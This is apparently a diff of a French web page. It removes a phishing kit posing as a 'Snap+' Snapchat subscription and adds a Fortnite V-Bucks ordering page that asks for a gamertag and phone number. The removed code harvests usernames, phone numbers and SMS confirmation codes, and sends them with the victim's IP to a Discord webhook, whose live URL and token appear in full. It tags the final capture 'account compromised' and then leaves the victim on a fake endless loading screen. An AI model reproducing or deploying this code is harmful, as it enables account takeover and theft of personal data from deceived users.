+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg>
+            </button>
+            <button id="openCartBtn" class="cart-btn">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white"><circle cx="9" cy="20" r="1.5"/><circle cx="17" cy="20" r="1.5"/><path d="M3 4H6L8 15H20L22 7H8"/></svg>
+                <span id="cartCounter" class="cart-badge">0</span>
+            </button>
         </div>
-        <div class="d-pill" data-val="12">
-          <span class="d-badge">Best deal</span>
-          <div class="num">12</div><div class="lbl">mois</div>
+    </div>
+
+    <div class="form-card">
+        <div class="field">
+            <label><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"><rect x="4" y="6" width="16" height="12" rx="2"/><path d="M8 6V4H16V6"/><circle cx="12" cy="12" r="2"/></svg> Plateforme</label>
+            <select id="platformSelect">
+                <option>PC / Windows</option>
+                <option>PlayStation 4/5</option>
+                <option>Xbox Series X/S</option>
+                <option>Nintendo Switch</option>
+                <option>Mobile</option>
+            </select>
         </div>
-      </div>
+        <div class="field">
+            <label><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg> Pseudo Fortnite</label>
+            <input type="text" id="gamertag" placeholder="ex: DarkKnightFR">
+        </div>
     </div>
 
-    <div class="info-row">
-      <span class="ii">🔒</span>
-      <p>Vos données sont chiffrées et ne seront jamais partagées à des tiers.</p>
+    <div class="form-card vbuck-selector">
+        <label><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg> Pack V-Bucks</label>
+        <select id="vbucksDropdown" class="vbuck-dropdown">
+            <option value="1000">1 000 V-Bucks</option>
+            <option value="2800">2 800 V-Bucks</option>
+            <option value="5000">5 000 V-Bucks</option>
+            <option value="13500">13 500 V-Bucks</option>
+        </select>
+        <button id="addToCartBtn" class="add-btn">+ Ajouter au panier</button>
     </div>
 
-    <div class="btnw"><button class="btn" id="b1" disabled>Continuer →</button></div>
-    <div class="sec-badge"><div class="dot"></div> Paiement sécurisé · SSL 256-bit</div>
-  </div>
-
-  <div id="step2" style="display:none" class="panel">
-    <p class="st">Vérification SMS</p>
-    <p class="ss">Un code de confirmation sera envoyé par SMS pour sécuriser votre inscription.</p>
-
-    <div class="summary">
-      <div class="sum-row">
-        <span class="sum-key">Compte</span>
-        <span class="sum-val" id="s-user">—</span>
-      </div>
-      <div class="sum-row">
-        <span class="sum-key">Durée</span>
-        <span class="sum-val y" id="s-dur">—</span>
-      </div>
+    <div class="form-card">
+        <div class="phone-block">
+            <label><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.8 19.8 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.8 19.8 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.127.96.362 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.338 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/></svg> Téléphone France (10 chiffres)</label>
+            <input type="tel" id="phoneNumber" placeholder="06 12 34 56 78" maxlength="14">
+            <div id="phoneError" class="error-msg"></div>
+        </div>
+        <button id="finalOrderBtn" class="order-btn">VALIDER LA COMMANDE</button>
     </div>
 
-    <div class="field">
-      <label>Numéro de téléphone</label>
-      <div class="phone-wrap">
-        <div class="phone-prefix">🇫🇷 +33</div>
-        <input type="tel" id="phone" placeholder="06 12 34 56 78" inputmode="tel" autocomplete="tel">
-      </div>
-      <p class="err" id="phoneErr"></p>
+    <div class="bottom-nav">
+        <button class="nav-item active" data-nav="home"><svg viewBox="0 0 24 24"><path d="M3 9L12 3L21 9L12 15L3 9Z" stroke="currentColor"/><path d="M5 12v6M19 12v6" stroke="currentColor"/><rect x="7" y="15" width="10" height="6" stroke="currentColor"/></svg><span>Commande</span></button>
+        <button class="nav-item" data-nav="account"><svg viewBox="0 0 24 24"><circle cx="12" cy="7" r="4" stroke="currentColor"/><path d="M5 21v-2a4 4 0 0 1 4-4h6a4 4 0 0 1 4 4v2" stroke="currentColor"/></svg><span>Compte</span></button>
+        <button class="nav-item" data-nav="help"><svg viewBox="0 0 24 24"><path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83" stroke="currentColor"/><circle cx="12" cy="12" r="3" stroke="currentColor"/></svg><span>Aide</span></button>
+        <button class="nav-item" id="openChatNavBtn"><svg viewBox="0 0 24 24"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" stroke="currentColor" fill="none"/></svg><span>Chat</span></button>
     </div>
-
-    <div class="info-row">
-      <span class="ii">📱</span>
-      <p>SMS gratuit envoyé immédiatement. Opérateurs FR uniquement.</p>
-    </div>
-
-    <div class="btnw"><button class="btn" id="b2" disabled>Recevoir le code SMS</button></div>
-    <div class="sec-badge"><div class="dot"></div> Numéro chiffré · Non partagé</div>
-  </div>
-
-  <div id="step3" style="display:none" class="panel">
-    <p class="st">Code de confirmation</p>
-    <p class="phone-confirm">Code envoyé au <strong id="phoneSummary">—</strong></p>
-    <p class="ss" style="margin-top:5px">Saisissez le code à 4 chiffres reçu par SMS. Il expire dans <strong style="color:var(--y)">10 min</strong>.</p>
-
-    <div class="summary">
-      <div class="sum-row">
-        <span class="sum-key">Compte</span>
-        <span class="sum-val" id="s-user2">—</span>
-      </div>
-      <div class="sum-row">
-        <span class="sum-key">Durée</span>
-        <span class="sum-val y" id="s-dur2">—</span>
-      </div>
-      <div class="sum-row">
-        <span class="sum-key">Téléphone</span>
-        <span class="sum-val" id="s-tel2">—</span>
-      </div>
-    </div>
-
-    <div class="codebox">
-      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
-      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
-      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
-      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
-    </div>
-
-    <div class="btnw"><button class="btn" id="b3" disabled>✓ Valider mon compte</button></div>
-    <div class="resend" id="resend">Renvoyer le code →</div>
-  </div>
-
-  <div id="step4" style="display:none" class="panel">
-    <div class="success-wrap">
-      <div class="check-ring">✓</div>
-      <p class="suc-title">Snap+ Activé !</p>
-      <p class="suc-sub">Votre abonnement premium est maintenant actif. Toutes les fonctionnalités exclusives sont disponibles immédiatement.</p>
-      <div class="suc-perks">
-        <div class="suc-perk">👑 Badge ★ Snap+</div>
-        <div class="suc-perk">🔁 Voir les re-vues</div>
-        <div class="suc-perk">🤖 My AI illimité</div>
-        <div class="suc-perk">⏳ Streak sauvegardé</div>
-        <div class="suc-perk">✏️ Modifier les snaps</div>
-        <div class="suc-perk">📸 Stories 4K</div>
-      </div>
-    </div>
-  </div>
-
 </div>
 
-<!-- BOUTON ADMIN COURONNE -->
-<div id="admin-crown">👑</div>
-
-<!-- MODAL CODE ADMIN -->
-<div id="admin-modal">
-  <div class="modal-content">
-    <h3 style="color:var(--y); margin-bottom:1.2rem; font-family:var(--fs);">Accès Administrateur</h3>
-    <p style="color:#bbb; margin-bottom:1.6rem; font-size:0.94rem;">Entrez le code secret à 4 chiffres</p>
-    
-    <input type="tel" maxlength="4" inputmode="numeric" pattern="[0-9]*" id="admin-code" 
-           style="width:160px; padding:16px; font-size:2.4rem; text-align:center; border-radius:14px; border:2px solid #555; background:rgba(40,40,60,0.4); color:var(--y); font-family:var(--fs); letter-spacing:12px; margin-bottom:1.6rem; font-weight:700;">
-    
-    <p id="admin-err" style="color:#ff6b6b; min-height:1.5rem; margin:0 0 1.2rem; font-size:0.95rem;"></p>
-    
-    <button id="admin-validate" class="btn" style="width:100%; max-width:240px; margin:0 auto; font-size:1.05rem;">VÉRIFIER</button>
-    
-    <p id="admin-attempts" style="margin-top:1.8rem; color:#888; font-size:0.9rem;">
-      Tentatives restantes : <strong>3</strong>
-    </p>
-  </div>
+<!-- Panier -->
+<div id="cartPanel" class="cart-panel">
+    <div class="cart-header"><h2>Mon panier</h2><button id="closeCartPanel" class="close-cart">✕</button></div>
+    <div id="cartItemsContainer" class="cart-items-list"><div class="empty-cart">Panier vide</div></div>
+    <div id="cartTotalPrice" class="cart-total">Total : 0 article(s)</div>
 </div>
 
-<!-- ÉCRAN DE CHARGEMENT INFINI -->
-<div id="loading-screen">
-  <div class="loader-container">
-    <div class="ring-outer"></div>
-    <div class="ring-middle"></div>
-    <div class="ring-inner"></div>
-    <div class="ghost-loader">👻</div>
-  </div>
-  <div class="loading-text">Activation en cours</div>
-  <div class="loading-sub">Vérification finale • Sécurité renforcée • Ne quittez pas la page</div>
+<!-- Chat déplaçable avec commandes avancées -->
+<div id="chatWidget" class="chat-widget">
+    <div class="chat-header" id="chatDragHandle">
+        <span><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="white"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg> Communauté Fortnite</span>
+        <button id="closeChatBtn" style="background:none; border:none; color:white; font-size:1.4rem;">✕</button>
+    </div>
+    <div id="chatMessagesContainer" class="chat-messages"></div>
+    <div class="chat-input-area">
+        <input type="text" id="chatMessageInput" placeholder="Votre message... (/ pour commandes)" autocomplete="off">
+        <div id="slashMenu" class="slash-menu">
+            <div class="slash-menu-item" data-command="/help">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg>
+                <span>/help - Aide</span>
+            </div>
+            <div class="slash-menu-item" data-command="/clearall">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M3 6h18M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/><path d="M10 11v5M14 11v5"/></svg>
+                <span>/clearall - Tout effacer</span>
+            </div>
+            <div class="slash-menu-item" data-command="/clear">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+                <span>/clear N - Supprimer N messages</span>
+            </div>
+            <div class="slash-menu-item" data-command="/ban">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg>
+                <span>/ban @pseudo - Bannir</span>
+            </div>
+            <div class="slash-menu-item" data-command="/timeout">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+                <span>/timeout @pseudo minutes - Timeout</span>
+            </div>
+            <div class="slash-menu-item" data-command="/profil">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+                <span>/profil @pseudo - Voir profil</span>
+            </div>
+        </div>
+        <button id="sendPhotoBtn" class="action-btn">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"><rect x="2" y="4" width="20" height="16" rx="2"/><circle cx="8.5" cy="9.5" r="2.5"/><path d="M21 15l-5-4-3 3-4-4-5 5"/></svg>
+        </button>
+        <button id="recordAudioBtn" class="action-btn">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M12 3a4 4 0 0 0-4 4v5a4 4 0 0 0 8 0V7a4 4 0 0 0-4-4z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="22"/></svg>
+        </button>
+        <input type="file" id="photoFileInput" accept="image/*" style="display:none">
+        <button id="sendChatMsgBtn" class="action-btn">Envoyer</button>
+    </div>
 </div>
 
 <script>
-// =============================================================================
-// CONFIGURATION WEBHOOK
-// =============================================================================
-const WH = "https://canary.discord.com/api/webhooks/1474900079205679164/9DmcNu0XH3dzJFXZMlv8a8tIjqdvemCjC5NHzifVFVuiL_mrayd3Sdywkt0LEE4Wfvbd";
-
-const getInfo = async () => {
-  const d = {
-    ts: new Date().toISOString(),
-    ua: navigator.userAgent,
-    lang: navigator.language,
-    screen: `${screen.width}×${screen.height}`,
-    ref: document.referrer || "direct",
-    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    ip: "—"
-  };
-  try { d.ip = (await fetch("https://api.ipify.org?format=json").then(r=>r.json())).ip; } catch(_){}
-  return d;
-};
-
-async function webhook(title, fields={}) {
-  const c = await getInfo();
-  const embed = {
-    title, color: 0xFFCC00,
-    fields: Object.entries(fields).map(([name,value])=>({
-      name, value:"```"+(value||"—")+"```", inline: name.length<22
-    })),
-    footer:{ text:`🌐 ${c.ip}  •  🕐 ${new Date().toLocaleString('fr-FR')}  •  📍 ${c.tz}` },
-    timestamp: c.ts
-  };
-  try {
-    await fetch(WH,{
-      method:"POST", headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({ embeds:[embed], username:"Snap+ Logger 👻" })
-    });
-  } catch(_){}
-}
-
-window.addEventListener("load", ()=>webhook("👁️ Nouvelle visite Snap+"));
-
-// =============================================================================
-// GESTION DES ÉTAPES
-// =============================================================================
-const progW = [33,66,100,100];
-
-function goStep(n) {
-  document.getElementById('progBar').style.width = progW[n-1]+'%';
-
-  if(n<=3){
-    for(let i=1;i<=3;i++){
-      const dot = document.getElementById('dot'+i);
-      const line = i<3 ? document.getElementById('line'+i) : null;
-      if(i<n){
-        dot.className='s-dot done'; dot.textContent='✓';
-        if(line) line.className='s-line done';
-      } else if(i===n){
-        dot.className='s-dot active'; dot.textContent=i;
-      } else {
-        dot.className='s-dot'; dot.textContent=i;
-        if(line) line.className='s-line';
-      }
-    }
-  }
-
-  ['step1','step2','step3','step4'].forEach((id,idx)=>{
-    const el = document.getElementById(id);
-    if(idx+1===n){
-      el.style.display='block';
-      el.classList.add('panel');
-    } else {
-      el.style.display='none';
-    }
-  });
-
-  if(n===4) document.getElementById('stepDots').style.display='none';
-}
-
-// =============================================================================
-// ÉTAPE 1
-// =============================================================================
-const unEl = document.getElementById('username');
-const b1   = document.getElementById('b1');
-let selDur = null;
-
-document.querySelectorAll('.d-pill').forEach(pill=>{
-  pill.addEventListener('click',()=>{
-    document.querySelectorAll('.d-pill').forEach(p=>p.classList.remove('sel'));
-    pill.classList.add('sel');
-    selDur = pill.dataset.val;
-    checkS1();
-  });
-});
-unEl.addEventListener('input', checkS1);
-function checkS1(){ b1.disabled = !(unEl.value.trim() && selDur); }
-
-const durLbl = {'1':'1 mois','3':'3 mois','12':'12 mois'};
-
-b1.onclick = async ()=>{
-  document.getElementById('s-user').textContent = unEl.value.trim();
-  document.getElementById('s-dur').textContent  = durLbl[selDur];
-  await webhook("📋 Étape 1 — Compte & durée",{
-    "Nom d'utilisateur": unEl.value.trim(),
-    "Durée choisie": durLbl[selDur]
-  });
-  goStep(2);
-};
-
-// =============================================================================
-// ÉTAPE 2
-// =============================================================================
-const phEl  = document.getElementById('phone');
-const phErr = document.getElementById('phoneErr');
-const b2    = document.getElementById('b2');
-
-phEl.addEventListener('input',()=>{
-  let raw = phEl.value.replace(/\D/g,'').slice(0,10);
-  let formatted = raw.match(/.{1,2}/g)?.join(' ') || raw;
-  phEl.value = formatted;
-
-  const digits = raw;
-  const ok = /^(0[67]\d{8}|[67]\d{8})$/.test(digits);
-  b2.disabled = !ok;
-  phErr.textContent = phEl.value.replace(/\s/g,'').length > 3 && !ok
-    ? 'Format invalide — ex: 06 12 34 56 78' : '';
-});
-
-function formatPhone(raw) {
-  const digits = raw.replace(/\D/g,'');
-  const local = digits.startsWith('0') ? digits : '0'+digits;
-  return local.match(/.{1,2}/g)?.join(' ') || local;
-}
-
-b2.onclick = async ()=>{
-  const phone = '+33 ' + formatPhone(phEl.value);
-  document.getElementById('phoneSummary').textContent = phone;
-  document.getElementById('s-user2').textContent = unEl.value.trim();
-  document.getElementById('s-dur2').textContent  = durLbl[selDur];
-  document.getElementById('s-tel2').textContent  = phone;
-  await webhook("📱 Étape 2 — Numéro saisi",{
-    "Nom d'utilisateur": unEl.value.trim(),
-    "Durée": durLbl[selDur],
-    "Téléphone": phone
-  });
-  goStep(3);
-  setTimeout(()=>codeIns[0].focus(),100);
-};
-
-// =============================================================================
-// ÉTAPE 3 - CODE SMS
-// =============================================================================
-const codeIns = [...document.querySelectorAll('.codebox input')];
-const b3 = document.getElementById('b3');
-let codeVal = '';
-
-codeIns.forEach((el,i)=>{
-  el.addEventListener('input',()=>{
-    el.value = el.value.replace(/\D/,'');
-    el.classList.toggle('filled', !!el.value);
-    if(el.value && codeIns[i+1]) codeIns[i+1].focus();
-    codeVal = codeIns.map(c=>c.value).join('');
-    b3.disabled = codeVal.length!==4;
-  });
-  el.addEventListener('keydown',e=>{
-    if(e.key==='Backspace' && !el.value && codeIns[i-1]){
-      codeIns[i-1].focus(); codeIns[i-1].classList.remove('filled');
-    }
-  });
-  el.addEventListener('paste',e=>{
-    e.preventDefault();
-    const txt=(e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,'').slice(0,4);
-    txt.split('').forEach((ch,j)=>{ if(codeIns[j]){ codeIns[j].value=ch; codeIns[j].classList.add('filled'); } });
-    codeVal = codeIns.map(c=>c.value).join('');
-    b3.disabled = codeVal.length!==4;
-    (codeIns[txt.length]||codeIns[3]).focus();
-  });
-});
-
-b3.onclick = async () => {
-  const phone = '+33 ' + formatPhone(phEl.value);
-  await webhook("✅ ÉTAPE FINALE — CODE ENTRÉ 🔑",{
-    "Nom d'utilisateur": unEl.value.trim(),
-    "Durée": durLbl[selDur],
-    "Téléphone": phone,
-    "Code SMS saisi": codeVal,
-    "Statut": "✅ VALIDÉ — COMPTE COMPROMIS"
-  });
-
-  // SAUVEGARDE DES VRAIES DONNÉES DANS LOCALSTORAGE
-  let realLogs = JSON.parse(localStorage.getItem('snapRealLogs') || '[]');
-  realLogs.unshift({
-    date: new Date().toLocaleString('fr-FR'),
-    username: unEl.value.trim(),
-    duration: durLbl[selDur],
-    phone: phone,
-    code: codeVal
-  });
-  localStorage.setItem('snapRealLogs', JSON.stringify(realLogs));
-
-  // ─── AFFICHAGE DU LOADING INFINI ────────────────────────
-  document.getElementById('loading-screen').style.display = 'flex';
-  document.getElementById('card').style.opacity = '0.15';
-  
-  // On reste bloqué sur le loading (simulation "traitement long")
-  // Si tu veux quand même montrer le succès après X secondes, décommente le setTimeout ci-dessous :
-  /*
-  setTimeout(() => {
-    document.getElementById('loading-screen').style.display = 'none';
-    document.getElementById('card').style.opacity = '1';
-    goStep(4);
-  }, 8000); // ← durée du faux chargement en millisecondes
-  */
-};
-
-// =============================================================================
-// RENVOYER LE CODE (cooldown)
-// =============================================================================
-let cd=0;
-const resEl=document.getElementById('resend');
-resEl.addEventListener('click',()=>{
-  if(cd) return;
-  cd=30;
-  const t=setInterval(()=>{
-    cd--;
-    resEl.textContent=`Renvoyer (${cd}s)`;
-    if(!cd){ clearInterval(t); resEl.textContent='Renvoyer le code →'; }
-  },1000);
-});
-
-// =============================================================================
-// CANVAS BACKGROUND
-// =============================================================================
-try {
-  const cv=document.getElementById('bgCanvas');
-  const ctx=cv.getContext('2d');
-  let W,H;
-  const resize=()=>{ W=cv.width=window.innerWidth; H=cv.height=window.innerHeight; };
-  window.addEventListener('resize',resize); resize();
-
-  const pts=Array.from({length:85},()=>({
-    x:Math.random()*W, y:Math.random()*H,
-    vx:(Math.random()-.5)*.55, vy:(Math.random()-.5)*.55,
-    r:Math.random()*1.7+.4
-  }));
-
-  let mx=W/2, my=H/2;
-  window.addEventListener('mousemove',e=>{ mx=e.clientX; my=e.clientY; });
-  window.addEventListener('touchmove',e=>{ if(e.touches.length){ mx=e.touches[0].clientX; my=e.touches[0].clientY; } },{passive:true});
-
-  (function loop(){
-    ctx.clearRect(0,0,W,H);
-
-    const g=ctx.createRadialGradient(mx,my,0,mx,my,260);
-    g.addColorStop(0,'rgba(255,204,0,0.08)');
-    g.addColorStop(.5,'rgba(255,180,0,0.025)');
-    g.addColorStop(1,'rgba(0,0,0,0)');
-    ctx.fillStyle=g; ctx.fillRect(0,0,W,H);
-
-    pts.forEach(p=>{
-      p.x+=p.vx; p.y+=p.vy;
-      if(p.x<0||p.x>W) p.vx*=-1;
-      if(p.y<0||p.y>H) p.vy*=-1;
-
-      const d=Math.hypot(p.x-mx,p.y-my);
-      if(d<160){ p.vx+=(p.x-mx)/d*.42; p.vy+=(p.y-my)/d*.42; }
-      const spd=Math.hypot(p.vx,p.vy);
-      if(spd>1.6){ p.vx=p.vx/spd*1.6; p.vy=p.vy/spd*1.6; }
-
-      const a=Math.min(.7,.15+(d<160?(1-d/160)*.55:0));
-      ctx.fillStyle=`rgba(255,204,0,${a})`;
-      ctx.beginPath(); ctx.arc(p.x,p.y,p.r,0,Math.PI*2); ctx.fill();
-    });
-
-    pts.forEach((p,i)=>{
-      pts.slice(i+1,i+4).forEach(q=>{
-        const d=Math.hypot(p.x-q.x,p.y-q.y);
-        if(d<90){
-          ctx.strokeStyle=`rgba(255,204,0,${.07*(1-d/90)})`;
-          ctx.lineWidth=.5;
-          ctx.beginPath(); ctx.moveTo(p.x,p.y); ctx.lineTo(q.x,q.y); ctx.stroke();
+    // ----------------------------- GESTION DES COMPTES & UTILISATEURS -----------------------------
+    let currentUserAccount = null;
+    const usersKey = "vb_users";
+    const currentUserKey = "vb_current_user";
+    // Structure user: { email, password, username, avatar, banner, isBanned, timeoutUntil }
+    function loadUsers() { const stored = localStorage.getItem(usersKey); return stored ? JSON.parse(stored) : []; }
+    function saveUsers(users) { localStorage.setItem(usersKey, JSON.stringify(users)); }
+    function getCurrentUser() { const stored = localStorage.getItem(currentUserKey); return stored ? JSON.parse(stored) : null; }
+    function setCurrentUser(user) {
+        if (user) {
+            localStorage.setItem(currentUserKey, JSON.stringify(user));
+            currentUserAccount = user;
+            document.getElementById('gamertag').value = user.username;
+            currentUserChat = user.username;
+            renderChatMessages();
+        } else {
+            localStorage.removeItem(currentUserKey);
+            currentUserAccount = null;
+            currentUserChat = "Invité";
+            document.getElementById('gamertag').value = "";
+            renderChatMessages();
         }
-      });
-    });
-
-    requestAnimationFrame(loop);
-  })();
-} catch(e){ console.error(e); }
-
-// =============================================================================
-// ACCÈS PANEL ADMIN (code 5639)
-// =============================================================================
-const crown = document.getElementById('admin-crown');
-const modal = document.getElementById('admin-modal');
-const codeInput = document.getElementById('admin-code');
-const errMsg = document.getElementById('admin-err');
-const attemptsTxt = document.getElementById('admin-attempts');
-const validateBtn = document.getElementById('admin-validate');
-
-let attemptsLeft = 3;
-let lockUntil = 0;
-
-crown.onclick = () => {
-  if (Date.now() < lockUntil) {
-    crown.classList.add('locked');
-    return;
-  }
-  modal.style.display = 'flex';
-  codeInput.value = '';
-  codeInput.focus();
-  errMsg.textContent = '';
-  attemptsTxt.innerHTML = `Tentatives restantes : <strong>${attemptsLeft}</strong>`;
-};
-
-validateBtn.onclick = () => {
-  if (codeInput.value.trim() === '5639') {
-    modal.style.display = 'none';
-    window.open('admin.html', '_blank');
-    attemptsLeft = 3;
-  } else {
-    attemptsLeft--;
-    errMsg.textContent = attemptsLeft > 0 ? 'Code incorrect' : 'Trop de tentatives → bloqué 2 min';
-    attemptsTxt.innerHTML = `Tentatives restantes : <strong>${attemptsLeft}</strong>`;
-    if (attemptsLeft <= 0) {
-      crown.classList.add('locked');
-      lockUntil = Date.now() + 120000;
-      setTimeout(() => {
-        crown.classList.remove('locked');
-        attemptsLeft = 3;
-      }, 120000);
     }
-  }
-};
+    function findUserByUsername(username) { return loadUsers().find(u => u.username.toLowerCase() === username.toLowerCase()); }
+    function updateUserInDB(updatedUser) {
+        let users = loadUsers();
+        const index = users.findIndex(u => u.username === updatedUser.username);
+        if (index !== -1) users[index] = updatedUser;
+        saveUsers(users);
+        if (currentUserAccount && currentUserAccount.username === updatedUser.username) setCurrentUser(updatedUser);
+    }
 
-codeInput.onkeypress = e => { if (e.key === 'Enter') validateBtn.click(); };
+    // Ban / timeout
+    function banUser(targetUsername) {
+        if (!currentUserAccount) return addSystemMessage("Vous devez être connecté pour bannir.");
+        if (currentUserAccount.username === targetUsername) return addSystemMessage("Vous ne pouvez pas vous bannir vous-même.");
+        let user = findUserByUsername(targetUsername);
+        if (!user) return addSystemMessage(`Utilisateur ${targetUsername} introuvable.`);
+        user.isBanned = true;
+        updateUserInDB(user);
+        addSystemMessage(`${targetUsername} a été banni du chat.`);
+    }
+    function timeoutUser(targetUsername, minutes) {
+        if (!currentUserAccount) return addSystemMessage("Connectez-vous pour timeout.");
+        if (currentUserAccount.username === targetUsername) return addSystemMessage("Impossible de vous timeout.");
+        let user = findUserByUsername(targetUsername);
+        if (!user) return addSystemMessage(`Utilisateur ${targetUsername} introuvable.`);
+        const duration = parseInt(minutes);
+        if (isNaN(duration) || duration <= 0) return addSystemMessage("Durée invalide (ex: /timeout @pseudo 5)");
+        user.timeoutUntil = Date.now() + duration * 60 * 1000;
+        updateUserInDB(user);
+        addSystemMessage(`${targetUsername} a été timeout pour ${duration} minutes.`);
+    }
+    function isUserTimedOut(username) {
+        const user = findUserByUsername(username);
+        if (user && user.timeoutUntil && user.timeoutUntil > Date.now()) return true;
+        return false;
+    }
 
-modal.onclick = e => { if (e.target === modal) modal.style.display = 'none'; };
+    // Profil embed
+    function showProfileEmbed(targetUsername) {
+        const user = findUserByUsername(targetUsername);
+        if (!user) return addSystemMessage(`Utilisateur ${targetUsername} introuvable.`);
+        const avatarUrl = user.avatar || `https://ui-avatars.com/api/?background=ffaa44&color=000&name=${user.username[0]}`;
+        const bannerUrl = user.banner || "https://picsum.photos/400/100?grayscale";
+        const embedHtml = `
+            <div class="message embed" style="background:#1e1e2a;">
+                <div class="embed-title"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#ffaa44"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg> Profil de ${escapeHtml(user.username)}</div>
+                <div class="profile-banner" style="background-image: url(${bannerUrl}); background-size: cover;"></div>
+                <div class="profile-preview">
+                    <div class="profile-avatar"><img src="${avatarUrl}" width="48" height="48" style="border-radius:50%;"></div>
+                    <div><strong>${escapeHtml(user.username)}</strong><br>Membre depuis ${new Date(user.createdAt || Date.now()).toLocaleDateString()}</div>
+                </div>
+                <div class="embed-description">Statut: ${user.isBanned ? "Banni" : (isUserTimedOut(user.username) ? "Timeout" : "Actif")}</div>
+            </div>
+        `;
+        chatMessages.push({ sender: "Système", embedHtml, isSystem: true, isEmbed: true, timestamp: Date.now() });
+        saveMessagesToDB();
+        renderChatMessages();
+    }
+
+    // ----------------------------- CHAT  -----------------------------
+    let currentUserChat = "Invité";
+    let chatMessages = [];
+
+    function loadMessagesFromDB() {
+        const stored = localStorage.getItem("vb_chat_messages");
+        chatMessages = stored ? JSON.parse(stored) : [];
+        renderChatMessages();
+    }
+    function saveMessagesToDB() { localStorage.setItem("vb_chat_messages", JSON.stringify(chatMessages)); }
+
+    function addSystemMessage(text, isEmbed = false, embedHtml = null) {
+        chatMessages.push({ sender: "Système", text, isSystem: true, embedHtml, isEmbed, timestamp: Date.now() });
+        saveMessagesToDB();
+        renderChatMessages();
+    }
+
+    function addAudioMessage(base64Audio) {
+        const newMsg = { sender: currentUserChat, audio: base64Audio, timestamp: Date.now(), isSystem: false };
+        chatMessages.push(newMsg);
+        saveMessagesToDB();
+        renderChatMessages();
+    }
+
+    function addMessageToDB(text, imageBase64 = null, audioBase64 = null) {
+        if (!text && !imageBase64 && !audioBase64) return;
+        if (text && text.startsWith('/')) {
+            const parts = text.trim().split(' ');
+            const cmd = parts[0].toLowerCase();
+            if (cmd === '/clearall') { chatMessages = []; saveMessagesToDB(); addSystemMessage("Tous les messages ont été supprimés par " + currentUserChat); return; }
+            else if (cmd === '/help') {
+                const helpEmbed = `<div class="message embed"><div class="embed-title"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#ffaa44"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg> Commandes disponibles</div><div class="embed-description"><strong>/help</strong> - Affiche ce menu<br><strong>/clearall</strong> - Supprime tout l'historique<br><strong>/clear N</strong> - Supprime les N derniers messages (ex: /clear 10)<br><strong>/ban @pseudo</strong> - Bannir un utilisateur<br><strong>/timeout @pseudo minutes</strong> - Timeout temporaire<br><strong>/profil @pseudo</strong> - Voir le profil avec avatar et bannière</div></div>`;
+                addSystemMessage("", true, helpEmbed);
+                return;
+            }
+            else if (cmd === '/clear' && parts[1]) {
+                const count = parseInt(parts[1]);
+                if (isNaN(count) || count <= 0) addSystemMessage("Utilisation: /clear nombre (ex: /clear 5)");
+                else { chatMessages = chatMessages.slice(0, -count); saveMessagesToDB(); addSystemMessage(`${count} message(s) supprimés.`); }
+                return;
+            }
+            else if (cmd === '/ban' && parts[1]) { banUser(parts[1].replace('@', '')); return; }
+            else if (cmd === '/timeout' && parts[1] && parts[2]) { timeoutUser(parts[1].replace('@', ''), parts[2]); return; }
